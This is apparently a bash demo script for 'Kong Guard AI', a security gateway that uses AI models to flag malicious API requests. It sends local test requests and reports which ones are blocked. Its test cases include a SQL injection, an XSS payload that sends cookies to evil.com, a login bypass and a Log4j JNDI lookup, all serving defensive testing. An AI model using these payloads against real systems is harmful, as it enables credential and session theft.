#!/bin/bash

# Kong Guard AI - Enterprise AI Detection Demo with Real AI
# This script demonstrates real AI-powered threat detection

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║   Kong Guard AI - Enterprise AI Threat Detection (REAL AI)   ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Configuration
KONG_URL="http://localhost:18000"
AI_SERVICE_URL="http://localhost:8000"
TEST_ENDPOINT="/test"

# Check if AI service is running
check_ai_service() {
    echo -e "${CYAN}Checking AI Service status...${NC}"
    response=$(curl -s "$AI_SERVICE_URL/" 2>/dev/null)
    if [ $? -eq 0 ]; then
        provider=$(echo "$response" | grep -o '"ai_provider":"[^"]*"' | cut -d'"' -f4)
        echo -e "${GREEN}✓ AI Service is running${NC}"
        echo -e "${BLUE}  Provider: ${MAGENTA}$provider${NC}"
        
        # Check which API key is configured
        stats=$(curl -s "$AI_SERVICE_URL/stats" 2>/dev/null)
        echo -e "${BLUE}  Status: Active${NC}"
        echo ""
    else
        echo -e "${RED}✗ AI Service is not running${NC}"
        echo -e "${YELLOW}Starting AI service...${NC}"
        echo "Run: docker-compose -f docker-compose-with-ai.yml up -d"
        exit 1
    fi
}

# Function to test a request with AI analysis
test_ai_request() {
    local test_name="$1"
    local method="$2"
    local url="$3"
    local data="$4"
    local expected_result="$5"
    
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${YELLOW}Test:${NC} $test_name"
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    
    # First, show what AI thinks about this request
    echo -e "${CYAN}AI Pre-Analysis:${NC}"
    
    # Create AI analysis request
    if [ "$method" = "GET" ]; then
        ai_request='{
            "features": {
                "method": "GET",
                "path": "'$url'",
                "client_ip": "203.0.113.100",
                "user_agent": "TestClient/1.0",
                "requests_per_minute": 10,
                "content_length": 0,
                "query_param_count": 2,
                "header_count": 5,
                "hour_of_day": 14,
                "query": "'$(echo $url | sed 's/.*?//')'",
                "body": ""
            },
            "context": {
                "previous_requests": 5,
                "failed_attempts": 0,
                "anomaly_score": 0.1
            }
        }'
    else
        ai_request='{
            "features": {
                "method": "POST",
                "path": "'$url'",
                "client_ip": "203.0.113.100",
                "user_agent": "TestClient/1.0",
                "requests_per_minute": 10,
                "content_length": '${#data}',
                "query_param_count": 0,
                "header_count": 5,
                "hour_of_day": 14,
                "query": "",
                "body": '$(echo "$data" | sed 's/"/\\"/g' | sed ':a;N;$!ba;s/\n/\\n/g')'
            },
            "context": {
                "previous_requests": 5,
                "failed_attempts": 0,
                "anomaly_score": 0.1
            }
        }'
    fi
    
    # Get AI analysis
    ai_response=$(curl -s -X POST -H "Content-Type: application/json" \
        -d "$ai_request" \
        "$AI_SERVICE_URL/analyze" 2>/dev/null)
    
    if [ $? -eq 0 ]; then
        threat_score=$(echo "$ai_response" | grep -o '"threat_score":[0-9.]*' | cut -d':' -f2)
        threat_type=$(echo "$ai_response" | grep -o '"threat_type":"[^"]*"' | cut -d'"' -f4)
        confidence=$(echo "$ai_response" | grep -o '"confidence":[0-9.]*' | cut -d':' -f2)
        reasoning=$(echo "$ai_response" | grep -o '"reasoning":"[^"]*"' | cut -d'"' -f4)
        action=$(echo "$ai_response" | grep -o '"recommended_action":"[^"]*"' | cut -d'"' -f4)
        ai_model=$(echo "$ai_response" | grep -o '"ai_model":"[^"]*"' | cut -d'"' -f4)
        
        echo -e "  ${MAGENTA}AI Model:${NC} $ai_model"
        echo -e "  ${MAGENTA}Threat Score:${NC} $threat_score"
        echo -e "  ${MAGENTA}Threat Type:${NC} $threat_type"
        echo -e "  ${MAGENTA}Confidence:${NC} $confidence"
        echo -e "  ${MAGENTA}Action:${NC} $action"
        echo -e "  ${MAGENTA}Reasoning:${NC} $reasoning"
    else
        echo -e "  ${YELLOW}AI analysis unavailable${NC}"
    fi
    
    echo ""
    
    # Now test through Kong
    echo -e "${CYAN}Kong Gateway Test:${NC}"
    if [ "$method" = "GET" ]; then
        echo "Request: GET $url"
        response=$(curl -s -w "\n%{http_code}" -m 5 "$KONG_URL$url" 2>/dev/null)
    else
        echo "Request: POST $url"
        echo "Body: $data"
        response=$(curl -s -w "\n%{http_code}" -X POST -H "Content-Type: application/json" -d "$data" -m 5 "$KONG_URL$url" 2>/dev/null)
    fi
    
    http_code=$(echo "$response" | tail -n 1)
    body=$(echo "$response" | head -n -1)
    
    # Parse response
    if [ "$http_code" = "403" ]; then
        echo -e "${RED}✗ BLOCKED${NC} (HTTP $http_code)"
        threat_type=$(echo "$body" | grep -o '"threat_type":"[^"]*"' | cut -d'"' -f4 || echo "unknown")
        incident_id=$(echo "$body" | grep -o '"incident_id":"[^"]*"' | cut -d'"' -f4 || echo "N/A")
        echo -e "Threat Type: ${RED}$threat_type${NC}"
        echo "Incident ID: $incident_id"
        
        # Check if AI was used
        if echo "$body" | grep -q "ai_powered"; then
            echo -e "${GREEN}✓ AI-Powered Detection${NC}"
        fi
    elif [ "$http_code" = "429" ]; then
        echo -e "${YELLOW}⚠ RATE LIMITED${NC} (HTTP $http_code)"
    elif [ "$http_code" = "200" ]; then
        echo -e "${GREEN}✓ ALLOWED${NC} (HTTP $http_code)"
    else
        echo -e "${RED}✗ ERROR${NC} (HTTP $http_code)"
    fi
    
    echo ""
}

# Check AI service first
check_ai_service

# Start tests
echo "Starting Real AI-powered threat detection tests..."
echo -e "${MAGENTA}Using AI provider from environment configuration${NC}"
echo ""

# Test 1: Normal request
test_ai_request \
    "Normal User Request" \
    "GET" \
    "/test/get?name=John&email=john@example.com" \
    "" \
    "ALLOW"

# Test 2: SQL Injection
test_ai_request \
    "SQL Injection Attack" \
    "GET" \
    "/test/get?id=1'+UNION+SELECT+username,password+FROM+users--" \
    "" \
    "BLOCK"

# Test 3: XSS Attack
test_ai_request \
    "Cross-Site Scripting (XSS)" \
    "POST" \
    "/test/post" \
    '{"comment":"<script>fetch(\"http://evil.com/steal?cookie=\"+document.cookie)</script>"}' \
    "BLOCK"

# Test 4: Sophisticated Attack
test_ai_request \
    "Obfuscated SQL Injection" \
    "POST" \
    "/test/login" \
    '{"username":"admin","password":"x\" OR \"1\"=\"1\" /*","remember":true}' \
    "BLOCK"

# Test 5: Zero-day pattern
test_ai_request \
    "Potential Zero-Day (Log4j style)" \
    "POST" \
    "/test/api" \
    '{"data":"${jndi:ldap://malicious.server/a}","type":"log4j"}' \
    "BLOCK"

# Test 6: Complex business logic attack
test_ai_request \
    "Complex Business Logic Attack" \
    "POST" \
    "/test/transfer" \
    '{"from_account":"12345","to_account":"99999","amount":-1000000,"notes":"overflow attempt"}' \
    "BLOCK"

# Test 7: API abuse pattern
test_ai_request \
    "API Abuse Pattern" \
    "POST" \
    "/test/api/v1/users" \
    '{"action":"bulk_export","limit":999999,"fields":["*"],"include_sensitive":true}' \
    "BLOCK"

# Test 8: Benign but complex request
test_ai_request \
    "Complex But Legitimate Request" \
    "POST" \
    "/test/search" \
    '{"query":"SELECT products WHERE category=\"electronics\" AND price < 1000","sort":"price_asc","limit":50}' \
    "ALLOW"

# Summary
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║                     AI ANALYSIS SUMMARY                      ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""

# Get AI service stats
stats=$(curl -s "$AI_SERVICE_URL/stats" 2>/dev/null)
if [ $? -eq 0 ]; then
    total_threats=$(echo "$stats" | grep -o '"total_threats":[0-9]*' | cut -d':' -f2)
    blocked_ips=$(echo "$stats" | grep -o '"blocked_ips":[0-9]*' | cut -d':' -f2)
    ai_provider=$(echo "$stats" | grep -o '"ai_provider":"[^"]*"' | cut -d'"' -f4)
    
    echo -e "${CYAN}AI Provider:${NC} ${MAGENTA}$ai_provider${NC}"
    echo -e "${CYAN}Total Threats Detected:${NC} $total_threats"
    echo -e "${CYAN}IPs Blocked:${NC} $blocked_ips"
fi

echo ""
echo "Kong Guard AI Enterprise Features:"
echo -e "${GREEN}✓${NC} Real AI-Powered Analysis (not rule-based)"
echo -e "${GREEN}✓${NC} Multiple AI Provider Support"
echo -e "${GREEN}✓${NC} Google Gemini Flash 2.5 Integration"
echo -e "${GREEN}✓${NC} Context-Aware Threat Detection"
echo -e "${GREEN}✓${NC} Zero-Day Pattern Recognition"
echo -e "${GREEN}✓${NC} Business Logic Attack Detection"
echo -e "${GREEN}✓${NC} Adaptive Learning Capability"
echo -e "${GREEN}✓${NC} Enterprise-Grade Performance"
echo ""
echo -e "${GREEN}Real AI threat detection is protecting your APIs!${NC}"
echo ""
echo "To use different AI providers:"
echo "  1. Set GEMINI_API_KEY in .env for Google Gemini Flash 2.5"
echo "  2. Set OPENAI_API_KEY in .env for GPT-4"
echo "  3. Set GROQ_API_KEY in .env for ultra-fast Groq inference"
echo "  4. Run Ollama locally for private LLM inference"